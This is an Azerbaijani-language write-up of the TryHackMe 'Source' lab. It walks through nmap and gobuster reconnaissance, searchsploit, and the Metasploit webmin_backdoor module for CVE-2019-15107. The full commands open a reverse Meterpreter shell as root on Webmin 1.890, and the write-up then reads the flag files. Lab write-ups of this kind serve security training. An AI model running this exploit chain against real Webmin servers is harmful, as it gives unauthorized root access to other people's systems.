# TryHackMe — Source Writeup (Azərbaycanca)

**Platforma:** TryHackMe  
**Otaq:** [Source](https://tryhackme.com/room/source)  
**Çətinlik:** Asan  
**OS:** Linux  
**Zəiflik:** Webmin 1.890 — CVE-2019-15107 (RCE)  
**Tarix:** 2026  

---

## 📋 Məzmun

1. [Kəşfiyyat (Reconnaissance)](#1-kəşfiyyat)
2. [Webmin Araşdırması](#2-webmin-araşdırması)
3. [Exploit — Metasploit](#3-exploit--metasploit)
4. [Root Girişi](#4-root-girişi)
5. [Flaglar](#5-flaglar)
6. [Nəticə](#6-nəticə)

---

## 1. Kəşfiyyat

### Nmap Skan

```bash
nmap -sV -sC -p- 10.10.x.x
```

**Tapılan portlar:**

| Port  | Xidmət | Versiya |
|-------|--------|---------|
| 22    | SSH    | OpenSSH 7.6p1 |
| 10000 | HTTP   | MiniServ 1.890 (Webmin httpd) |

Port 10000 — **Webmin** admin paneli.

### Webmin Səhifəsi

```
http://10.10.x.x:10000  →  SSL xətası
https://10.10.x.x:10000 →  Webmin login səhifəsi
```

### Gobuster

```bash
gobuster dir -u https://10.10.x.x:10000 \
  -w /usr/share/wordlists/dirb/common.txt -k
```

Heç bir faydalı nəticə çıxmadı.

---

## 2. Webmin Araşdırması

### Default Credentials Sınağı

```
admin:admin     ❌
admin:password  ❌
root:root       ❌
```

Heç biri işləmədi.

### Searchsploit

```bash
searchsploit webmin 1.890
```

**Nəticə:**
```
Webmin < 1.920 - 'rpc.cgi' Remote Code Execution (Metasploit)
linux/webapps/47330.rb
```

**CVE-2019-15107** — Webmin 1.890 versiyasında **Remote Code Execution (RCE)** zəifliyi var!

Bu zəiflik `password_change.cgi` modulunda mövcuddur və autentifikasiya tələb etmədən istifadə edilə bilər.

---

## 3. Exploit — Metasploit

### Metasploit Başlat

```bash
msfconsole
```

### Exploit Axtar

```bash
search webmin
# və ya
search 1.920
```

**Tapılan exploit:**
```
exploit/linux/http/webmin_backdoor
Rank: Excellent
```

### Konfiqurasiya

```bash
use exploit/linux/http/webmin_backdoor
show options
```

```bash
set RHOSTS 10.10.x.x
set RPORT 10000
set SSL true
set LHOST 10.x.x.x   # Kali IP
set LPORT 4444
```

### Exploit İşlət

```bash
run
```

**Nəticə:**
```
[*] Started reverse TCP handler on 10.x.x.x:4444
[*] Attempting to execute the payload...
[+] Successfully exploited the vulnerability
[*] Meterpreter session 1 opened
meterpreter >
```

Birbaşa **root** kimi shell əldə edildi!

---

## 4. Root Girişi

### Kimik?

```bash
meterpreter > getuid
Server username: root
```

### Shell Al

```bash
meterpreter > shell
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

### Flagları Tap

```bash
find / -name "*.txt" -path "*/root*" 2>/dev/null
find / -name "user.txt" 2>/dev/null
```

---

## 5. Flaglar

```bash
# User flag
cat /home/dark/user.txt

# Root flag  
cat /root/root.txt
```

| Flag | Məkan |
|------|-------|
| User flag | `/home/dark/user.txt` |
| Root flag | `/root/root.txt` |

---

## 6. Nəticə

### İstifadə Olunan Alətlər

| Alət | Məqsəd |
|------|--------|
| Nmap | Port və servis skanı |
| Gobuster | Qovluq kəşfi |
| Searchsploit | Exploit axtarışı |
| Metasploit | RCE exploit |

### Hücum Zənciri

```
Nmap Skanı
    ↓
Port 10000 — Webmin 1.890 tapıldı
    ↓
Searchsploit → CVE-2019-15107 (RCE)
    ↓
Metasploit → webmin_backdoor exploit
    ↓
Birbaşa Root Shell 🏆
```

### CVE-2019-15107 Haqqında

Bu zəiflik Webmin 1.890 versiyasının `password_change.cgi` modulunda mövcuddur. Zəiflik səbəbi ilə:

- Autentifikasiya tələb edilmir
- Uzaqdan kod icra etmək mümkündür
- Birbaşa root səlahiyyəti əldə edilir

Webmin 1.930 versiyasında düzəldilmişdir.

### Öyrənilən Dərslər

- Xidmət versiyaları həmişə CVE bazasında yoxlanılmalıdır
- `searchsploit` sürətli exploit tapmaq üçün vacib alətdir
- Köhnə versiyalı admin panelləri böyük risq yaradır
- Webmin kimi güclü alətlər mütəmadi yenilənməlidir

---

*Bu writeup yalnız təhsil məqsədli hazırlanmışdır. TryHackMe platformasındakı "Source" CTF laboratoriyasına aiddir.*
